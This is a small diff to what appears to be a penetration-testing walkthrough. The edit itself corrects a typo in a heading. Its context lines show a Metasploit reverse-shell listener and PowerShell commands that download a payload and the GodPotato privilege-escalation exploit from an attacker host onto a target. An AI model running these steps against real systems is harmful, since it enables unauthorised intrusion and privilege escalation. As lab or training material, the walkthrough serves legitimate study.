@@ -78,7 +78,7 @@ msf6 exploit(multi/handler) > set LPORT 443
 msf6 exploit(multi/handler) > run
 ```
 
-xploit the system:
+Exploit the system:
 ``` powershell
 iwr http://192.168.1.1:8888/payload.exe -outfile payload.exe                                    ## download payload on target system
 iwr http://192.168.1.1:8888/GodPotato.exe -outfile GodPotato.exe                                ## download exploit on target system
